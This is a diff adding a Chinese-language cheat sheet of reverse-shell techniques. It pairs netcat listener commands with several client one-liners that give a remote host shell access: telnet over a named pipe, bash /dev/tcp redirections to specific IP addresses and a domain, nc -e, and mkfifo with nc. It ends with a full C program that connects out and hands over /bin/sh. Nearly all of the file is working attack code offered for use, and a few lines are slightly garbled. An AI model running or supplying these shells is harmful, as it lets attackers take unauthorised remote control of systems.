@@ -1,0 +1,92 @@
+服务端(控制端)
+nc -l -p 8080 -vvv
+nc -l -p 8080
+nc -l 8080
+
+客户端(被控端)
+第一种:需要telnet功能，一般嵌入式设备都会有，下次使用前请删除backpipe
+	mknod backpipe p && telnet 172.31.137.106 8080 0<backpipe | /bin/bash 1>backpipe
+	如果提示/bin/bash不存在请将/bash/bash换位/bin/sh
+
+第二种:需要/dev/tcp功能存在，有的机器不存在
+	bash -i >& /dev/tcp/182.254.217.165/8080 0>&1
+
+#另一种很巧妙的方法，不依赖于/bin/sh
+exec 5<>/dev/tcp/flyff.site/8080
+cat <&5 | while read line; do $line 2>&5 >&5; done
+
+#还可以
+exec /bin/bash 0&0 2>&0
+0<&196;exec 196<>/dev/tcp/182.254.217.165/8080; sh <&196 >&196 2>&196
+
+/bin/bash  -i > /dev/tcp/182.254.217.165/8080 0<&1 2>&1
+#2>表示错误重定向，&1表示标准输出
+
+#构造http请求获取网页
+exec 3<>/dev/tcp/www.baidu.com/80
+echo -e "GET / HTTP/1.1\r\nhost: http://www.baidu.com\r\nConnection: close\r\n\r\n" >&3
+cat <&3
+
+第三种:需要用到nc，大多嵌入式设备不存在
+nc -e /bin/sh 172.31.137.106 8080
+#不同版本的nc不一定支持-e选项
+#不能使用-e选项时，可以使用第一种方法
+/bin/sh | nc 172.31.137.106 8080
+
+rm -f /tmp/p; mknod /tmp/p p && nc 172.31.137.106 8080 0/tmp/
+#安装的nc有问题的时候
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.31.137.106 8080 >/tmp/f
+
+第四种:需要bash
+bash -i >& /dev/tcp/182.254.217.165/8080 0>&1
+# &表示后台运行 2>&1是将标准出错重定向到标准输出
+
+C语言版本
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <netinet/in.h>
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <netinet/in.h>
+#include <netdb.h>
+
+void usage();
+char shell[]="/bin/sh";
+char message[]="hacker welcomen";
+int sock;
+int main(int argc, char *argv[]) {
+	if(argc <3){
+		usage(argv[0]);
+	}
+	struct sockaddr_in server;
+	if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
+		printf("Couldn't make socket!n"); exit(-1);
+	}
+
+	server.sin_family = AF_INET;
+	server.sin_port = htons(atoi(argv[2]));
+	server.sin_addr.s_addr = inet_addr(argv[1]);
+
+	if(connect(sock, (struct sockaddr *)&server, sizeof(struct sockaddr)) == -1) {
+	printf("Could not connect to remote shell!n");
+	exit(-1);
+}
+send(sock, message, sizeof(message), 0);
+	dup2(sock, 0);
+	dup2(sock, 1);
+	dup2(sock, 2);
+	execl(shell,"/bin/sh",(char *)0);
+	close(sock);
+	return 1;
+}
+void usage(char *prog[]) {
+printf("Usage: %s <reflect ip> <port>n", prog);
+exit(-1);
+}
+//保存为test.c　，运行gcc -o test test.c后编绎，编绎成功后。运行用法和perl版shell的用法一样
